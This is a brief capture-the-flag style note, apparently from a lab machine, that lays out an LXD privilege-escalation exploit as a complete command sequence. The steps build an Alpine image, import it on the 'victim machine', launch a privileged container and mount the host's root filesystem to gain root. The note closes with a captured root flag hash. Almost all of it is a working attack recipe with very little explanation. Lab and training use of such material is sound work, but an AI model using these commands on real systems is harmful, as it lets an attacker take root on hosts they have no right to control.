lxd exploit 

```
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default 
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

and we have root
because we are in image and we mounted the device itself the directory will be in /mnt/root
root.txt `c693d9c7499d9f572ee375d4c14c7bcf`
